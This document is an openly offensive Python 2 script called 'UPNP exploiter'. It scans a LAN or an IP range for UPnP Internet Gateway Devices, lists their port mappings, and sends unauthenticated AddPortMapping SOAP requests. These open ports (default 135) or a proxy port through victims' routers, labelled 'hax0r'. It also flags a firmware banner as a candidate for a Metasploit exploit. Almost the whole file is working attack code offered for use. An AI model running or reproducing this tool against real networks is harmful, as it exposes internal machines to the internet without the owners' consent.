#!/bin/python
import urllib2, re, sys, select, socket

###
# Some static info
##
tport = 49170;
upnport = 1900;
msg = "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nST: ssdp:all\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\n\r\n";

###
# Used to ping one target.
###
def target():
 data = []
 try:
  tar = sys.argv[2];
  if sys.argv[2].find("*") != -1:
   star = sys.argv[2].split(".*");
   i = 1;
   while i < 255:
    tar = star[0]+"."+str(i)
    print "Sending UPNP packets to "+tar;
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
    s.bind(("", tport));
    s.sendto(msg, (tar, upnport));
    i += 1;
  else:
   print "Sending UPNP packets to "+tar;
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
   s.bind(("", tport));
   s.sendto(msg, (tar, upnport));
  print "Waiting for data";
  print "Press Ctrl+c at anytime to stop capture";
  while True:
   string, addr = s.recvfrom(1024);
   data.append([addr[0], string]);
   print "Got some data";
 except KeyboardInterrupt: 
  s.close();
  proc(data);

###
# Used to ping lan
###
def lan():
 #data = "";
 data = [];
 try:
  print "Sending broadcast UPNP packets to lan";
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
  s.bind(("", tport));
  s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1);
  s.sendto(msg, ("239.255.255.250", 1900));
  print "Waiting for data";
  print "Press Ctrl+c at anytime to stop capture";
  while True:
   res = select.select([s],[],[]);
   string, addr = res[0][0].recvfrom(1024);
   #data += string;
   data.append([addr[0], string]);
   print "Got some data";
 except KeyboardInterrupt: 
  s.close();
  proc(data);

###
# open ports on routers
###
def sploit(host):
 #print host;
 #exit(1);
 print "LOL you are evil";
 rhost = re.findall("([^/]+)", host);
 print "Well here goes nothing...";
 print "Trying to get some info from the target...";
 try:
  res = urllib2.urlopen(host).read();
  res = res.replace("\r", "");
  res = res.replace("\n", "");
  res = res.replace("\t", "");
  pres = res.split("<serviceId>urn:upnp-org:serviceId:WANIPConn1</serviceId>");
  p2res = pres[1].split("</controlURL>");
  p3res = p2res[0].split("<controlURL>");
  ctrl = p3res[1];
  rip = res.split("<presentationURL>");
  rip1 = rip[1].split("</presentationURL>");
  routerIP = rip1[0];
  print "Router internal IP: "+routerIP;
  print "Ports already open:";
  print "INT:EXT:ADDR:Desc";
  i=1;
  try:
   while True:
    opmsg = '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:GetGenericPortMappingEntry xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingIndex>'+str(i)+'</NewPortMappingIndex></u:GetGenericPortMappingEntry></s:Body></s:Envelope>';
    open_ports = urllib2.Request("http://"+rhost[1]+""+ctrl, opmsg);
    open_ports.add_header("SOAPACTION", '"urn:schemas-upnp-org:service:WANIPConnection:1#GetGenericPortMappingEntry"');
    open_ports.add_header('Content-type', 'application/xml');
    open_res = urllib2.urlopen(open_ports).read();
    int1 = open_res.split('<NewInternalPort>');
    int2 = int1[1].split('</NewInternalPort>');
    intport = int2[0];
    ext1 = open_res.split('<NewExternalPort>');
    ext2 = ext1[1].split('</NewExternalPort>');
    extport = ext2[0];
    addr = open_res.split('<NewInternalClient>');
    addr1 = addr[1].split('</NewInternalClient>');
    address = addr1[0];
    des = open_res.split('<NewPortMappingDescription>');
    des1 = des[1].split('</NewPortMappingDescription>');
    desc = des1[0];
    print intport+":"+extport+":"+address+":"+desc
    i=i+1;
  except Exception, e:
   err=""
 except Exception, e:
  #print e;
  print "Failed to get anything from the target :/"
 IP = raw_input("IP of internal host to forward posts to: [192.168.1.100] ");
 if IP == "":
  IP = "192.168.1.100";
 port = raw_input("Port of internal host you want to forward to the net: [135] ");
 if port == "":
  port = "135";
 extport = raw_input("External port: [135] ");
 if extport == "":
  extport = "135";
 msg = '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>'+extport+'</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>'+port+'</NewInternalPort><NewInternalClient>'+IP+'</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>hax0r</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>';
 try:
  req = urllib2.Request("http://"+rhost[1]+""+ctrl, msg);
  req.add_header('SOAPAction', '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"');
  req.add_header('Content-type', 'application/xml');
  res = urllib2.urlopen(req);
  print "HOLY SHIT IT WORKED!!!";
 except Exception, e:
  print e;
  print "Shit it didnt work y0 :/";

###
# here we try to set up a proxy
###
def proxy(host):
 try:
  print "LOL you are evil";
  rhost = re.findall("([^/]+)", host);
  print "Well here goes nothing...";
  res = urllib2.urlopen(host).read();
  res = res.replace("\r", "");
  res = res.replace("\n", "");
  res = res.replace("\t", "");
  pres = res.split("<serviceId>urn:upnp-org:serviceId:WANIPConn1</serviceId>");
  p2res = pres[1].split("</controlURL>");
  p3res = p2res[0].split("<controlURL>");
  ctrl = p3res[1];
  IP = raw_input("IP the proxy connects to: [192.168.1.100] ");
  if IP == "":
   IP = "192.168.1.100";
  extport = raw_input("External port: [8080] ");
  if extport == "":
   extport = "8080";
  msg = '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>'+extport+'</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>80</NewInternalPort><NewInternalClient>'+IP+'</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>hax0r</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>';
  req = urllib2.Request("http://"+rhost[1]+""+ctrl, msg);
  req.add_header('SOAPAction', '"urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"');
  req.add_header('Content-type', 'application/xml');
  try:
   res = urllib2.urlopen(req);
   print "HOLY SHIT IT WORKED!!!";
  except Exception, e:
   print e;
   print "Shit it didnt work y0 :/";
 except Exception, e:
  print e;


###
# here we pick our attack
###
def choose(host):
 print "1) Open ports.";
 print "2) Open proxy.";
 meth = raw_input("Which attack you wanna do?: [1] ");
 if meth == "1":
  sploit(host);
 if meth == "2":
  proxy(host);
 if meth == "":
  sploit(host);

###
# Proccess data from lan or target
###
def proc(data):
 if len(data) == 0:
  done("");
 print "\r\nWorking with the data we got...";
 pdata = dict((x[0], x) for x in data).values()
 rh = [];
 for L in pdata:
  rh.append(L[0]);
 hosts = [];
 pd = [];
 print "Making a few connections...";
 for host in rh:
  try:
   spot = rh.index(host);
   hdata = pdata[spot][1];
   url = "http://"+host+":";
   port = re.findall("http:\/\/[0-9\.]+:(\d.+)", hdata);
   url += port[0];
   p = urllib2.urlopen(url, timeout=3);
   rd = re.findall("schemas-upnp-org:device:([^:]+)", p.read());
   if rd[0] == "InternetGatewayDevice":
    addr = re.findall("http://([^:]+)", url);
    vuln = "Linux/2.6.17.WB_WPCM450.1.3 UPnP/1.0, Intel SDK for UPnP devices/1.3.1";
    if hdata.find(vuln) != -1:
     d = raw_input(addr[0]+" might be open to the unique_service_name() exploit, open msf and give it a go. For more information goto this URL - http://www.osvdb.org/show/osvdb/89611 Press enter to continue.");
    #yesnosploit = raw_input(addr[0]+" is a router, do you want to try to open ports? (Y)es/(N)o: ");
    yesnosploit = raw_input(addr[0]+" is a router/modem, do you want to try to exploit is?: (Y)es/(n)o ");
    if yesnosploit.lower() == "y":
     choose(url);
    if yesnosploit == "":
     choose(url);
   pd.append([url, rd[0]]);
  except:
   err = "";
   pd.append([url, "Could not connect..."]);
 done(pd);

###
# This func displays info we got
###
def done(data):
 if len(data) == 0:
  print "\r\nNo UPNP supported devices found :(";
  ###
  # Welcome msg
  ###
  print "";
  print "##########################";
  print "# UPNP exploiter         #";
  print "# By: Anarchy Angel      #";
  print "# www.dc414.org          #";
  print "# Happy hacking :)       #";
  print "##########################";
  exit(1);
 for info in data:
#  if sys.argv[1] == "target":
#   port = re.findall("([^:]+)", info[0]);
#   path = re.findall("([^/]+)", info[0]);
#   print "Device UPNP info page: http://"+sys.argv[2]+":"+port[2];
#  else:
#   print "Device UPNP info page: "+info[0];
  print "Device UPNP info page: "+info[0];
  print "Device type: "+info[1]+"\r\n";
 print "Done!";
 print "";
 ###
 # Welcome msg
 ###
 print "##########################";
 print "# UPNP exploiter         #";
 print "# By: Anarchy Angel      #";
 print "# www.dc414.org          #";
 print "# Happy hacking :)       #";
 print "##########################";
 exit(1);

###
# display usage
###
def usage():
 ###
 # Welcome msg
 ###
 print "##########################";
 print "# UPNP exploiter         #";
 print "# By: Anarchy Angel      #";
 print "# www.dc414.org          #";
 print "# Happy hacking :)       #";
 print "##########################";
 print "";
 print "upnp.py type ip";
 print "Types: lan/target";
 print "IP is only needed is using type target";
 print "scan ip range using *";
 print "i.e: python upnp.py target 123.456.789.*";
 print "Many thanks to Ngharo for all his help making this script";
 exit(1);

###
# parse argv and direct to right func
###
if len(sys.argv) == 1:
 usage();
elif sys.argv[1] == "lan":
 lan();
elif sys.argv[1] == "target":
 target();
else:
 usage(); 
